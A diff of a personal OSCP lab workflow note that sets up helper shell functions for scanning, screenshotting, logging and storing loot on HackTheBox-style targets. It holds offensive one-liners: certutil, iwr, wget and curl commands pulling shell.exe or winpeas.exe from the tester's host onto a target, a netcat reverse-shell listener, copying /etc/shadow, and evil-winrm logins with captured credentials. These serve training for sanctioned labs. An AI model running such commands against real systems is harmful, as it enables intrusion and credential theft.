@@ -1,291 +1,394 @@
 # OSCP Habits — Screenshot & Loot
 
-*The discipline that separates a clean report from a scramble at the end.*
+*Follow this file in order, every box, every time. The habits here exist because "I'll screenshot that later" and "I'll note that down" are how people lose flags and fail exam reports. Read each step, type the command, check the expected output, then move on.*
 
 ---
 
-## Pre-Engagement Setup
+## Before you do anything: is your VPN up?
 
-All shell functions live in `~/.zshrc`, no manual exports needed. Run `source ~/.zshrc` once per terminal session if they're not loading.
+Open a terminal and type:
 
-### Quick reference — all box functions
+```bash
+ip a show tun0
+```
 
-| Command | What it does |
-|---|---|
-| `boxstart <Name> <IP> [htb\|offsec\|thm]` | First time on a box — creates dirs in `~/Platforms/`, writes `.env`, starts log |
-| `boxload [Name]` | Reconnect in new terminal — sources vars, stamps log (auto-runs on terminal open if marker exists) |
-| `boxdone` | Clear current-box marker + unset all vars |
-| `boxset <VAR> <value>` | Update a variable live + save to `.env` |
-| `loot cred <user> <pass>` | Save credential → `loot/creds.txt` |
-| `loot hash <user> <hash>` | Save hash → `loot/hashes.txt` |
-| `loot flag <user\|root> <value>` | Save flag → `loot/flags.txt` |
-| `loot key <path>` | Copy SSH key → `loot/` (chmod 600) |
-| `loot file <path>` | Copy any file → `loot/` |
-| `shot <name>` | Screenshot → `screenshots/<name>.png` |
-| `www [port]` | HTTP server from `www/` dir (default :80) |
-| `transfer <file> [port]` | Copy file to `www/`, print download one-liners, start server |
-| `listener [port]` | `nc -lnvp` on `$Port` (default 4444) |
-| `nocolor <command>` | Strip ANSI codes from any tool's output |
-| `proof linux\|windows` | Print proof screenshot command to paste into target shell |
+You should see output like:
+
+```
+3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> ...
+    inet 10.10.14.5/23 ...
+```
+
+That `10.10.x.x` address is your VPN IP -- you'll need it constantly. If instead you get:
+
+```
+Device "tun0" does not exist.
+```
+
+Your VPN is not connected. Go connect OpenVPN first, then come back here. There's no point scanning without the tunnel.
 
 ---
 
-### First time on a new box
+## Step 1 — Load your shell functions
 
-```bash
-boxstart <BoxName> <BoxIP> [htb|offsec|thm]
-```
+Your helper commands (`boxstart`, `loot`, `shot`, etc.) are defined in `~/.zshrc`. In a normal terminal they load automatically, but if you type `boxstart` and get `command not found`, run this:
 
-Example:
-```bash
-boxstart Sea 10.10.11.28 htb
-```
-
-Platform shortcuts: `htb` = HackTheBox, `offsec` = Offsec, `thm` = TryHackMe. Defaults to `htb` if omitted.
-
-This does everything in one shot:
-- Creates `~/Platforms/HackTheBox/Sea/{nmap,loot,exploits,screenshots,www}/`
-- Writes all variables to `~/Platforms/HackTheBox/Sea/.env` (includes `BoxDir`, `BoxPlatform`)
-- Sources the `.env` immediately (all vars live in the current terminal)
-- `cd`s into the box directory
-- Writes `~/.current_box` so any new terminal auto-loads this box
-- Writes session start marker to `Sea.log`
-- Prints `LocalIP` so you can confirm VPN is up
-
-### New terminal (same box, reconnecting)
-
-```bash
-boxload [BoxName]
-```
-
-Sources `.env`, cds into the directory, stamps the log, refreshes `LocalIP` from `tun0`.
-
-**Auto-load:** if `~/.current_box` exists (written by `boxstart`/`boxload`), any new interactive terminal will auto-run `boxload` without typing anything. You'll see `[auto] box: Sea` on open.
-
-**Manual override:** `boxload Sea` always works and searches `~/Platforms/` across all platform directories.
-
-### Clearing a box session
-
-```bash
-boxdone
-```
-
-Deletes `~/.current_box` and unsets all box vars. New terminals will no longer auto-load. Run this when you're done with a box.
-
-### Updating a variable when you find creds or a new port
-
-```bash
-boxset Username john
-boxset Password Password123!
-boxset Port 9001
-```
-
-Updates live in current terminal AND saves to `.env`, every future `boxload` picks it up.
-
-> 📸 **Screenshot: terminal after `boxstart` or `boxload` confirming BoxIP and LocalIP**
-
-### Manual override (edge case)
-
-```bash
-nano $BoxDir/.env
-source $BoxDir/.env
-```
-
----
-
-## New Box Checklist (copy-paste in order)
-
-> Run these steps at the start of every box, in this order.
-
-**1 — Load functions (only needed once per terminal session)**
 ```bash
 source ~/.zshrc
 ```
 
-**2 — Spin up the box**
+You won't see any output -- that's normal. It just reloads your config. After that, all the commands below will work.
+
+You only need to do this if the commands aren't working. Most of the time you can skip straight to Step 2.
+
+---
+
+## Step 2 — Start the box
+
+This single command sets up everything for a new target. Replace `Sea` with the actual box name and `10.10.11.28` with the actual IP:
+
 ```bash
-boxstart <BoxName> <BoxIP> [htb|offsec|thm]
+boxstart Sea 10.10.11.28 htb
 ```
-Creates dirs, writes `.env`, exports all vars, cds into `~/Platforms/<Platform>/<BoxName>/`. Confirm `LocalIP` is shown and correct (VPN must be up).
 
-**3 — Command logging is automatic**
+The third argument is the platform. Use `htb` for HackTheBox, `offsec` for OffSec labs, `thm` for TryHackMe. If you leave it out, it defaults to `htb`.
 
-`preexec` in `.zshrc` stamps every command as `$ <command>` into `$BoxDir/$BoxName.log` before it runs. No manual step needed, as long as `BoxName` and `BoxDir` are set (done by `boxstart`/`boxload`), commands are logged.
+When it runs, you'll see something like:
 
-> **Why not `script`?** `script` captures the PTY stream, which embeds your zsh prompt's escape sequences around every typed character. Cleaning those sequences destroys the command text. `preexec` writes directly to the file, bypassing the PTY, so commands land cleanly.
+```
+[box] Sea started
+BoxName=Sea        BoxIP=10.10.11.28
+LocalIP=10.10.14.5
+BoxDir=/home/kali/Platforms/HackTheBox/Sea
+```
 
-**Optional: capture raw output too**
+**Check `LocalIP`.** It should be your `tun0` VPN address -- something like `10.10.14.x` for HTB or `192.168.x.x` for OffSec. If it shows your LAN IP instead, your VPN isn't up (go back to the VPN check above).
+
+After this command runs, you'll notice your terminal has automatically `cd`'d into `~/Platforms/HackTheBox/Sea/`. That's your working directory for this box. All your nmap output, loot, screenshots, and exploits will live here.
+
+**What `boxstart` created for you:**
+
+```
+~/Platforms/HackTheBox/Sea/
+├── nmap/          ← scan output goes here
+├── loot/          ← creds, hashes, flags, keys
+├── exploits/      ← exploits you download or write
+├── screenshots/   ← every shot command saves here
+├── www/           ← files you want to serve to the target
+├── Sea.log        ← your command history for this box
+└── .env           ← all your variables, saved to disk
+```
+
+It also wrote `~/.current_box` so any new terminal you open will automatically know you're working on Sea.
+
+**About logging:** from this point on, every command you type is automatically logged to `$BoxDir/Sea.log` -- you don't have to do anything. This is handled by a `preexec` hook in `.zshrc` that fires before every command and writes it (with a timestamp) to the log. You'll never lose track of what you ran.
+
+That log captures **commands only**, not the output they print. If you also want to capture terminal output -- for example, so you can read back exactly what nmap or linpeas printed -- run this in that terminal:
+
 ```bash
-script -a $BoxName.log
+htblog
 ```
-If you want tool output in the log as well as commands, run this. Be aware: the log will need ANSI stripping afterwards (`ansifilter -i $BoxName.log -o $BoxName.log`). For most purposes, screenshots cover output, the log is primarily for command history.
 
-**4 — Full TCP port scan**
+No argument needed when a box is loaded. It appends output capture on top of the existing command log. Type `exit` to stop capturing output (command logging keeps going regardless). Note that the captured output will contain ANSI colour codes -- if you want a clean version to read later:
+
+```bash
+ansifilter -i $BoxDir/Sea.log -o $BoxDir/Sea_clean.log
+```
+
+For most boxes you won't need `htblog` at all -- screenshots cover the output that matters. Use it when you're doing something methodical where you want a full record (e.g. a long enumeration phase you want to replay).
+
+> 📸 Take a screenshot right now:
+> ```bash
+> shot box-started
+> ```
+> Capture the terminal showing BoxIP and LocalIP. This confirms your setup is correct.
+
+---
+
+## Step 3 — Start the full TCP port scan
+
+You're in `~/Platforms/HackTheBox/Sea/`. Run this:
+
 ```bash
 nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP
 ```
 
-**5 — UDP scan (open a second terminal, run in parallel)**
+A note on the variables: `$BoxName` and `$BoxIP` were set by `boxstart`, so you don't need to type the actual box name or IP. They're already there.
+
+The `-oA` flag saves results in three formats (`.nmap`, `.gnmap`, `.xml`) to your `nmap/` folder. This takes 2-4 minutes depending on the target.
+
+While that's running, **open a second terminal** (Ctrl+Alt+T, or however you normally open terminals).
+
+---
+
+## Step 4 — Start the UDP scan in the second terminal
+
+When you open the second terminal, you should see:
+
+```
+[auto] box: Sea
+```
+
+That means it auto-loaded the box. All your variables are available here too -- `$BoxIP`, `$BoxName`, `$BoxDir`, everything. No setup needed.
+
+If you don't see that message, type:
+
 ```bash
-# New terminal auto-loads the box — just run the scan
+boxload Sea
+```
+
+Now run the UDP scan:
+
+```bash
 nmap -sU --top-ports 100 -oA nmap/${BoxName}_udp $BoxIP
 ```
 
-**6 — Service scan (paste the open ports from step 4)**
-```bash
-nmap -sC -sV -p <ports> -oA nmap/${BoxName}_services $BoxIP
-```
-
-> 📸 Screenshot: full port scan output
-> 📸 Screenshot: service scan output
+UDP scans are slow -- this one will take a while. Leave it running and go back to the first terminal.
 
 ---
 
-## Mid-Box: New Terminal
+## Step 5 — Run the service scan
 
-New terminal auto-loads the current box from `~/.current_box` — no command needed. You'll see `[auto] box: <Name>` on open.
+Back in terminal 1, when the full TCP scan finishes, you'll see a summary like:
 
-If auto-load didn't fire (no marker, or you're in a non-interactive shell):
-```bash
-boxload <BoxName>
+```
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+8080/tcp  open  http-alt
 ```
 
-All vars restored, cds into the box dir, `LocalIP` refreshed from `tun0`.
+Copy those port numbers and run a service scan on them:
+
+```bash
+nmap -sC -sV -p 22,80,8080 -oA nmap/${BoxName}_services $BoxIP
+```
+
+Replace `22,80,8080` with whatever ports you actually found. The `-sC` flag runs default scripts and `-sV` fingerprints the versions. This output is where you'll find software versions, banners, and sometimes credentials in plain text.
+
+When this finishes, you'll see version info and script output for each port. Read it carefully.
+
+> 📸 Screenshot the full TCP scan:
+> ```bash
+> shot nmap-allports
+> ```
+> Scroll up so all open ports are visible, then take it.
+
+> 📸 Screenshot the service scan:
+> ```bash
+> shot nmap-services
+> ```
+> This one should show the versions and any script output.
 
 ---
 
-## Mid-Box: Found Creds or New Info
+## Step 6 — Write your notes
+
+Before you start poking any service, open a scratch notes file:
+
+```bash
+nano $BoxDir/notes.md
+```
+
+Write down (in whatever format works for you -- bullet points, sentences, doesn't matter):
+- Every open port and what's on it
+- Every software version you can see (potential CVEs)
+- Every username you spotted anywhere
+- Every hostname or internal IP mentioned
+- Anything you noticed but haven't investigated yet
+- Anything you tried that didn't work (so you don't try it again)
+
+The habit is: **if you notice something, write it down immediately, before you do anything else**. Your brain will lie to you and say you'll remember it. You won't.
+
+---
+
+## Step 7 — Storing credentials and loot as you find them
+
+The second you find a username, password, hash, flag, SSH key, or interesting file -- store it. One command. Before you do anything else with it.
+
+**Found a username and password:**
+
+```bash
+loot cred admin Password123!
+```
+
+**Found an NTLM hash:**
+
+```bash
+loot hash john aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+```
+
+**Got the user flag:**
+
+```bash
+loot flag user d41d8cd98f00b204e9800998ecf8427e
+```
+
+**Got root / SYSTEM flag:**
+
+```bash
+loot flag root 098f6bcd4621d373cade4e832627b4f6
+```
+
+**Found an SSH private key:**
+
+```bash
+loot key /path/to/id_rsa
+```
+
+It copies the key to `loot/` and applies `chmod 600` automatically.
+
+**Found an interesting config file:**
+
+```bash
+loot file /etc/shadow
+```
+
+Everything lands in `$BoxDir/loot/` with a timestamp. To check what you've collected at any point:
+
+```bash
+cat $BoxDir/loot/creds.txt
+cat $BoxDir/loot/hashes.txt
+cat $BoxDir/loot/flags.txt
+ls $BoxDir/loot/
+```
+
+**Also save credentials to your session variables** so you can use them in commands without retyping:
 
 ```bash
 boxset Username admin
-boxset Password S3cr3t!
-boxset Port 9001
-```
-
-Saves to `.env` so every future `boxload` has the latest values.
-
----
-
-## Screenshot Checklist
-
-Use `shot <name>`, auto-saves to `screenshots/` with the right filename. Take it **before moving on**.
-
-| Moment | `shot` command | What to capture |
-|--------|---------------|-----------------|
-| Full port scan | `shot nmap-allports` | All open ports visible |
-| Service scan | `shot nmap-services` | Versions + script output |
-| Significant finding | `shot <service>-<finding>` e.g. `shot smb-null-session` | The discovery in context |
-| Foothold gained | `shot foothold` | `whoami` + `id` + `hostname` in shell |
-| User flag | `shot user-flag` | `cat local.txt` output |
-| PrivEsc discovery | `shot privesc-finding` | The vulnerable thing you found |
-| PrivEsc execution | `shot privesc-exploit` | The command that elevated you |
-| Root shell | `shot root-shell` | `whoami` → `root` or `nt authority\system` |
-| Root flag | `shot root-flag` | `cat proof.txt` output |
-| OSCP proof | `shot PROOF` | `whoami` + `hostname` + flag in one frame |
-
-> 🔧 Before the proof shot: run `proof linux` or `proof windows`, it prints the exact command to paste into the target shell. Screenshot the output.
-
-> 🔧 The OSCP exam proof screenshot needs all three visible at once: whoami, hostname/ipconfig, and the flag.
-
----
-
-## Loot Storage
-
-Store loot **immediately** on finding it. Don't trust your terminal history. Use `loot`, one command, no thinking.
-
-```bash
-loot cred $Username $Password        # → loot/creds.txt
-loot hash $Username $Hash            # → loot/hashes.txt
-loot flag user <value>               # → loot/flags.txt
-loot flag root <value>               # → loot/flags.txt
-loot key /path/to/id_rsa             # → loot/ (chmod 600 auto-applied)
-loot file /path/to/interesting.conf  # → loot/
-```
-
-Save creds to `.env` at the same time so you can use them in commands:
-```bash
-boxset Username john
 boxset Password Password123!
-loot cred $Username $Password
 ```
+
+After that, `$Username` and `$Password` are available in any command:
+
+```bash
+evil-winrm -i $BoxIP -u $Username -p $Password
+smbclient //$BoxIP/share -U $Username%$Password
+ssh $Username@$BoxIP
+```
+
+These variables save to `.env` on disk, so if you close the terminal and come back later, `boxload Sea` restores them all.
 
 ---
 
-## File Transfers to Target
+## Step 8 — Taking screenshots
 
-**One-command delivery:** `transfer` copies the file to `www/`, prints all download one-liners, and starts the HTTP server.
+Use the `shot` command -- it saves directly to `$BoxDir/screenshots/` with a `.png` extension. You just give it a name:
 
 ```bash
-transfer exploits/shell.exe        # serves on :80
-transfer exploits/shell.exe 8080   # serves on :8080
+shot nmap-allports
 ```
 
-Output you get:
-```
-URL:         http://$LocalIP:80/shell.exe
+That saves `~/Platforms/HackTheBox/Sea/screenshots/nmap-allports.png`.
 
-PowerShell:  iwr http://$LocalIP:80/shell.exe -o shell.exe
-certutil:    certutil -urlcache -split -f http://$LocalIP:80/shell.exe shell.exe
-wget:        wget http://$LocalIP:80/shell.exe
-curl:        curl http://$LocalIP:80/shell.exe -o shell.exe
-```
+**Take a screenshot before you move on.** The moment that terminal output scrolls away, or that window closes, is the moment you'll wish you had the screenshot. The report requires evidence for every finding -- you cannot go back and recreate it.
 
-Copy the right one-liner, paste into the target shell. Ctrl+C the server when done.
+Here's the full list of moments that need a screenshot, and the exact command name to use:
 
-**Manual:** drop files into `$BoxDir/www/` and run `www` to start the server.
+| When | Command | What must be visible in the shot |
+|------|---------|----------------------------------|
+| After `boxstart` | `shot box-started` | BoxIP and LocalIP both showing |
+| Full TCP scan done | `shot nmap-allports` | All open ports in the output |
+| Service scan done | `shot nmap-services` | Version info and script output |
+| Any significant finding | `shot <service>-<finding>` e.g. `shot http-admin-panel` | The finding in context |
+| Shell landed | `shot foothold` | `whoami` + `id` + `hostname` all in one frame |
+| User flag grabbed | `shot user-flag` | The `cat local.txt` output |
+| Found the PrivEsc route | `shot privesc-finding` | The vulnerable thing highlighted |
+| PrivEsc command ran | `shot privesc-exploit` | The command and its result |
+| Root / SYSTEM shell | `shot root-shell` | `whoami` showing `root` or `nt authority\system` |
+| Root flag grabbed | `shot root-flag` | The `cat proof.txt` output |
+| OSCP proof (exam) | `shot PROOF-Sea` | `whoami` + `hostname` + flag **all in one frame** |
 
-**Listener (reverse shells):**
+**For the OSCP exam proof shot specifically:** before you take it, run:
+
 ```bash
-listener          # nc -lnvp $Port (default 4444)
-listener 9001     # nc -lnvp 9001
+proof linux
+# or
+proof windows
 ```
+
+It prints the exact one-liner to paste into the target shell. Run that command on the target, then screenshot the output. The OSCP marking requires all three (whoami, hostname, flag) visible together in one frame.
 
 ---
 
-## During Enumeration — What to Note Down
+## Step 9 — When a shell lands
 
-Keep a running scratch note (`$BoxDir/notes.md`) with:
-- Open ports and services (copy from nmap output)
-- Software versions and anything searchsploit-able
-- Usernames found anywhere (files, headers, comments, web pages)
-- Passwords found anywhere, even partial ones or hints
-- Any internal hostnames or IPs seen
-- Any paths that look interesting but you haven't explored yet
-- What you tried that didn't work (prevents circling back)
+The moment a reverse shell connects to your listener, do these steps **before anything else**. A raw shell is fragile -- the wrong keystroke can kill it.
 
----
+### Linux shell
 
-## When You Get a Shell — Immediate Checklist
+**Step 1: Upgrade the shell.** Type this exactly:
 
-**Linux shell:**
 ```bash
-# 1. Upgrade it first — before doing anything else
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-# Ctrl+Z
-stty raw -echo; fg
-export TERM=xterm
-
-# 2. Confirm your identity
-whoami && id && hostname && ip a
-
-# 3. Screenshot (foothold-whoami.png)
-
-# 4. Quick orientation
-uname -a
-cat /etc/os-release
-cat /etc/passwd | grep -v nologin
 ```
 
-**Windows shell:**
+If you get `python3: command not found`, try `python` instead. If neither works, try:
+
+```bash
+/usr/bin/script -qc /bin/bash /dev/null
+```
+
+**Step 2: Press Ctrl+Z.** The shell goes to the background and you'll see `[1]+  Stopped` in your terminal. That's expected.
+
+**Step 3: Type this in your own terminal** (not the target):
+
+```bash
+stty raw -echo; fg
+```
+
+**Step 4: Press Enter twice.** Your shell should now be fully interactive -- you'll have arrow keys, tab completion, and Ctrl+C won't kill the connection.
+
+**Step 5: Set the terminal type:**
+
+```bash
+export TERM=xterm
+```
+
+**Step 6: Confirm who you are and where you are:**
+
+```bash
+whoami && id && hostname && ip a
+```
+
+You'll see your username, your groups, the hostname, and the network interfaces.
+
+> 📸 Take the foothold screenshot now, before doing anything else:
+> ```bash
+> shot foothold
+> ```
+> Scroll up slightly so `whoami`, `id`, and `hostname` are all visible.
+
+**Step 7: Quick orientation:**
+
+```bash
+uname -a                            # kernel version
+cat /etc/os-release                 # distro and version
+cat /etc/passwd | grep -v nologin   # real user accounts
+ls /home/                           # other users' home directories
+```
+
+---
+
+### Windows shell
+
+**Step 1: Confirm who you are:**
+
 ```cmd
-REM 1. Confirm identity
 whoami /all
 hostname
 ipconfig
+```
 
-REM 2. Screenshot
+> 📸 Take the foothold screenshot:
+> ```bash
+> shot foothold
+> ```
 
-REM 3. Quick orientation  
+**Step 2: Quick orientation:**
+
+```cmd
 systeminfo
 net user
 net localgroup administrators
@@ -293,23 +396,176 @@ net localgroup administrators
 
 ---
 
+## Step 10 — Opening more terminals mid-box
+
+Any new terminal you open will show:
+
+```
+[auto] box: Sea
+```
+
+And you'll be in your box directory with all variables loaded. No setup required.
+
+If for any reason that doesn't happen (non-interactive shell, marker got deleted, you're in tmux), just type:
+
+```bash
+boxload Sea
+```
+
+---
+
+## Step 11 — Transferring files to the target
+
+**The easy way -- `transfer` does everything:**
+
+```bash
+transfer exploits/winpeas.exe
+```
+
+You'll immediately see:
+
+```
+URL:         http://10.10.14.5:80/winpeas.exe
+
+PowerShell:  iwr http://10.10.14.5:80/winpeas.exe -o winpeas.exe
+certutil:    certutil -urlcache -split -f http://10.10.14.5:80/winpeas.exe winpeas.exe
+wget:        wget http://10.10.14.5:80/winpeas.exe
+curl:        curl http://10.10.14.5:80/winpeas.exe -o winpeas.exe
+```
+
+Copy the right download command for your target shell, paste it into the target, and wait for it to download. Then press Ctrl+C in your terminal to stop the server.
+
+To serve on a different port (useful if port 80 is blocked):
+
+```bash
+transfer exploits/winpeas.exe 8080
+```
+
+**If you want to serve multiple files:** drop them all into `$BoxDir/www/` and then run:
+
+```bash
+www
+```
+
+That starts a server on port 80 serving everything in the `www/` directory. Ctrl+C to stop.
+
+**Starting a reverse shell listener:**
+
+```bash
+listener           # listens on $Port (default 4444)
+listener 9001      # listens on port 9001
+```
+
+When a shell connects, you'll see the connection in this terminal -- immediately go to Step 9 to upgrade it.
+
+---
+
+## Step 12 — Updating variables as you discover more
+
+Every time you find a new credential, port, or hostname, update your variables immediately:
+
+```bash
+boxset Username john
+boxset Password Summer2024!
+boxset Port 5985
+```
+
+These save to `.env` so they survive terminal restarts. Use them:
+
+```bash
+evil-winrm -i $BoxIP -u $Username -p $Password
+crackmapexec smb $BoxIP -u $Username -p $Password
+ssh $Username@$BoxIP -p $Port
+```
+
+---
+
 ## End of Box — Pre-Report Checklist
 
-Before writing the report, verify you have:
-- [ ] All screenshots named and in `$BoxDir/screenshots/`
-- [ ] All flags recorded in `loot/flags.txt`
-- [ ] All creds recorded in `loot/creds.txt`
-- [ ] The OSCP proof screenshot, run `proof linux|windows`, paste into target shell, `shot PROOF`
-- [ ] The attack path clear in your head: how did you get from "open ports" to "root"?
+Before you start writing the report, go through this list. A missing screenshot is not something you can add later.
 
-**Knowledge gaps resolved — every technique must trace back:**
-- [ ] Every stage note row has a wikilink to its module note or hub doc section
-- [ ] Any technique not in the OSCP structure has been written into the right place (module note, HTB supplementary, hub doc), not just flagged, actually written
-- [ ] Tags are consistent between the stage note and the linked module/hub doc
-- [ ] If a new tool was used → entry added to Modern Tooling
-- [ ] If a command is worth a breakdown → added to the relevant Command Breakdowns file
+**Screenshots -- check each one exists in `$BoxDir/screenshots/`:**
+
+```bash
+ls $BoxDir/screenshots/
+```
+
+- [ ] `box-started.png` -- BoxIP and LocalIP confirmed
+- [ ] `nmap-allports.png` -- all open ports visible
+- [ ] `nmap-services.png` -- versions and script output
+- [ ] At least one screenshot per significant finding
+- [ ] `foothold.png` -- `whoami` + `id` + `hostname` in one frame
+- [ ] `user-flag.png` -- flag content visible
+- [ ] `privesc-finding.png` -- the vulnerable thing
+- [ ] `privesc-exploit.png` -- the command that elevated you
+- [ ] `root-shell.png` -- `whoami` → root or SYSTEM
+- [ ] `root-flag.png` -- flag content visible
+- [ ] `PROOF-Sea.png` (or your box name) -- `whoami` + `hostname` + flag all visible in one frame
+
+**Loot:**
+
+- [ ] Both flags are in `loot/flags.txt` (`cat $BoxDir/loot/flags.txt`)
+- [ ] Any creds found are in `loot/creds.txt`
+- [ ] Any hashes found are in `loot/hashes.txt`
+- [ ] Any SSH keys are in `loot/`
+
+**Knowledge:**
+
+- [ ] Every technique you used is represented in your notes
+- [ ] Any tool you used that's not in Modern Tooling has been noted to add
+- [ ] Any non-obvious command is noted to add to Command Breakdowns
 
 Then copy [[Box Report Template]] and fill it in while it's fresh.
+
+---
+
+## End of Box — Vault Feedback Loop
+
+*Do this after the report, while the box is still fresh. This is what makes every box improve the vault.*
+
+**Module notes -- Related Boxes:**
+- [ ] Open every module note whose technique you used on this box
+- [ ] Add the box to its `## 🎯 Related Boxes to Practice` section with: box name, platform, why it's relevant to that technique, and a wikilink stub `[[BoxName]]` for when the writeup is written
+- [ ] Be specific: "HTTP file upload bypass" not just "web"
+
+**MASTER BOX LIST:**
+- [ ] Add a row to `[[MASTER BOX LIST]]`: box name, platform, OS, difficulty, techniques used, module cross-refs
+- [ ] This is the index that lets you search "what boxes have DLL hijacking?" later
+
+**Runbook stage notes -- `box_sources`:**
+- [ ] Every runbook stage note you used on this box should have this box added to its `box_sources:` frontmatter
+- [ ] `box_sources:` tracks which real boxes informed each stage note. It's how stage notes grow from one-box examples into multi-box patterns over time.
+- [ ] Format: `box_sources: [clamAV, Sea, <new_box>]` -- just append
+- [ ] If a stage note doesn't exist yet, note it in the Master Index so it gets built next time
+
+**Back-fill new patterns:**
+- [ ] If you hit a technique variant not in the relevant stage note (e.g. a new auth bypass or a different CMS), add it as a new row in that stage note's command table
+- [ ] If the stage note doesn't exist yet and you did something novel, create it now while it's fresh
+
+---
+
+## Quick Reference -- All Box Commands
+
+Once you know what the commands do, this table is the fast lookup:
+
+| Command | What it does |
+|---|---|
+| `boxstart <Name> <IP> [htb\|offsec\|thm]` | First time on a box -- creates dirs, writes .env, starts log |
+| `boxload [Name]` | Reconnect in a new terminal -- restores all vars, cds into box dir |
+| `boxdone` | Clear current-box marker -- stops auto-loading on new terminals |
+| `boxset <VAR> <value>` | Update a variable live and save it to .env |
+| `loot cred <user> <pass>` | Save credential → `loot/creds.txt` |
+| `loot hash <user> <hash>` | Save hash → `loot/hashes.txt` |
+| `loot flag <user\|root> <value>` | Save flag → `loot/flags.txt` |
+| `loot key <path>` | Copy SSH key → `loot/` (chmod 600 applied automatically) |
+| `loot file <path>` | Copy any file → `loot/` |
+| `shot <name>` | Screenshot → `screenshots/<name>.png` |
+| `www [port]` | HTTP server from `www/` dir (default port 80) |
+| `transfer <file> [port]` | Copy file to `www/`, print download one-liners, start server |
+| `listener [port]` | `nc -lnvp` on `$Port` (default 4444) |
+| `nocolor <command>` | Strip ANSI colour codes from any tool's output |
+| `proof linux\|windows` | Print proof screenshot command to paste into target shell |
+| `htblog` | Capture terminal output to the box log (commands are already logged automatically -- this adds output on top) |
 
 ---
 
@@ -319,14 +575,14 @@ When you hit a technique on a box, these modules have the detail:
 
 | Area | Module |
 |------|--------|
-| Recon / enumeration | [[06. Information Gathering|Information Gathering]], [[07. Vulnerability Scanning|Vulnerability Scanning]] |
-| Web app attacks | [[08. Introduction to Web Application Attacks|Introduction to Web Application Attacks]], [[09. Common Web Application Attacks|Common Web Application Attacks]] |
-| SQLi | [[10. SQL Injection Attacks|SQL Injection Attacks]] |
-| File/client attacks | [[12. Client-Side Attacks|Client-Side Attacks]] |
-| Public exploits | [[13. Locating Public Exploits|Locating Public Exploits]], [[14. Fixing Exploits|Fixing Exploits]] |
-| AV evasion | [[15. Antivirus Evasion|Antivirus Evasion]] |
-| Passwords / hashes | [[16. Password Attacks|Password Attacks]] |
-| Linux privesc | [[18. Linux Privilege Escalation|Linux Privilege Escalation]] |
-| Windows privesc | [[17. Windows Privilege Escalation|Windows Privilege Escalation]] |
-| Pivoting | [[19. Port Redirection and SSH Tunneling|Port Redirection and SSH Tunneling]], [[20. Tunneling Through Deep Packet Inspection|Tunneling Through Deep Packet Inspection]] |
-| Active Directory | [[22. Active Directory Introduction and Enumeration|Active Directory Introduction and Enumeration]], [[23. Attacking Active Directory Authentication|Attacking Active Directory Authentication]], [[24. Lateral Movement in Active Directory|Lateral Movement in Active Directory]] |
+| Recon / enumeration | [[06. Information Gathering\|Information Gathering]], [[07. Vulnerability Scanning\|Vulnerability Scanning]] |
+| Web app attacks | [[08. Introduction to Web Application Attacks\|Introduction to Web Application Attacks]], [[09. Common Web Application Attacks\|Common Web Application Attacks]] |
+| SQLi | [[10. SQL Injection Attacks\|SQL Injection Attacks]] |
+| File / client attacks | [[12. Client-Side Attacks\|Client-Side Attacks]] |
+| Public exploits | [[13. Locating Public Exploits\|Locating Public Exploits]], [[14. Fixing Exploits\|Fixing Exploits]] |
+| AV evasion | [[15. Antivirus Evasion\|Antivirus Evasion]] |
+| Passwords / hashes | [[16. Password Attacks\|Password Attacks]] |
+| Linux privesc | [[18. Linux Privilege Escalation\|Linux Privilege Escalation]] |
+| Windows privesc | [[17. Windows Privilege Escalation\|Windows Privilege Escalation]] |
+| Pivoting | [[19. Port Redirection and SSH Tunneling\|Port Redirection and SSH Tunneling]], [[20. Tunneling Through Deep Packet Inspection\|Tunneling Through Deep Packet Inspection]] |
+| Active Directory | [[22. Active Directory Introduction and Enumeration\|Active Directory Introduction and Enumeration]], [[23. Attacking Active Directory Authentication\|Attacking Active Directory Authentication]], [[24. Lateral Movement in Active Directory\|Lateral Movement in Active Directory]] |
